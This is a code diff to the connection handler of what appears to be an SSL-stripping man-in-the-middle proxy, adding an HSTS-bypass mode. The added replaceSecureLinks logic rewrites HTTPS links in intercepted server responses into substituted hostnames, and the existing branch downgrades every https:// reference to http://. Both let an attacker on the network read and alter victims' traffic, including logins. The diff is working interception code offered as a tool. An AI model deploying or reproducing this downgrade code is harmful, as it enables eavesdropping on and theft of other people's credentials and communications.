@@ -33,6 +33,11 @@ class ServerConnection(HTTPClient):
     urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
     urlType           = re.compile(r"https://", re.IGNORECASE)
     urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
+    urlTypewww        = re.compile(r"https://www", re.IGNORECASE)
+    urlwExplicitPort  = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
+    urlToken1         = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
+    urlToken2         = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
+    #urlToken2        = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)
 
     def __init__(self, command, uri, postData, headers, client):
 
@@ -42,6 +47,7 @@ class ServerConnection(HTTPClient):
         self.headers          = headers
         self.client           = client
         self.urlMonitor       = URLMonitor.getInstance()
+        self.hsts             = URLMonitor.getInstance().isHstsBypass()
         self.plugins          = ProxyPlugins.getInstance()
         self.isImageRequest   = False
         self.isCompressed     = False
@@ -61,6 +67,9 @@ class ServerConnection(HTTPClient):
 
     def getPostPrefix(self):
         return "POST"
+
+    def isHsts(self):
+        return self.hsts
 
     def sendRequest(self):
         if self.command == 'GET':
@@ -231,19 +240,53 @@ class ServerConnection(HTTPClient):
             logging.info("Client connection dropped before request finished.")
 
     def replaceSecureLinks(self, data):
-        iterator = re.finditer(ServerConnection.urlExpression, data)
+        if self.hsts:
 
-        for match in iterator:
-            url = match.group()
+            sustitucion = {}
+            patchDict = self.urlMonitor.patchDict
+            if len(patchDict)>0:
+                dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
+                data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
 
-            logging.debug("Found secure reference: " + url)
+            iterator = re.finditer(ServerConnection.urlExpression, data)       
+            for match in iterator:
+                url = match.group()
 
-            url = url.replace('https://', 'http://', 1)
-            url = url.replace('&amp;', '&')
-            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+                logging.debug("Found secure reference: " + url)
+                nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+                logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
+                sustitucion[url] = nuevaurl
+                #data.replace(url,nuevaurl)
 
-        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
-        return re.sub(ServerConnection.urlType, 'http://', data)
+            #data = self.urlMonitor.DataReemplazo(data)
+            if len(sustitucion)>0:
+                dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
+                data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
+
+            #logging.debug("LEO DEBUG received data:\n"+data)   
+            #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
+            #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
+            #if data.find("http://w.face")!=-1:
+            #   logging.debug("LEO DEBUG Found error in modifications")
+            #   raw_input("Press Enter to continue")
+            #return re.sub(ServerConnection.urlType, 'http://web.', data)
+            return data
+
+        else:
+
+            iterator = re.finditer(ServerConnection.urlExpression, data)
+
+            for match in iterator:
+                url = match.group()
+
+                logging.debug("Found secure reference: " + url)
+
+                url = url.replace('https://', 'http://', 1)
+                url = url.replace('&amp;', '&')
+                self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+
+            data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
+            return re.sub(ServerConnection.urlType, 'http://', data)
 
     def shutdown(self):
         if not self.shutdownComplete:
